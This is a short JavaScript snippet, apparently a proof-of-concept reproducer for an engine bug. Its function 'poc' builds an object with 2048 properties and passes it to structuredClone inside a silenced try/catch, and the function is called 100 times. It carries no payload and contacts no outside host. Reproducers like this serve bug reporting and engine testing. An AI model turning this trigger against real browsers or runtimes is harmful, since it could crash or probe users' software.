function poc() {
    const o = {};
    for (let i = 0; i < 2048; i++) {
        o['p' + i] = 0;
    }
    try {
        structuredClone(o);
    } catch (e) {}
}

for (let i = 0; i < 100; i++) {
    poc();
}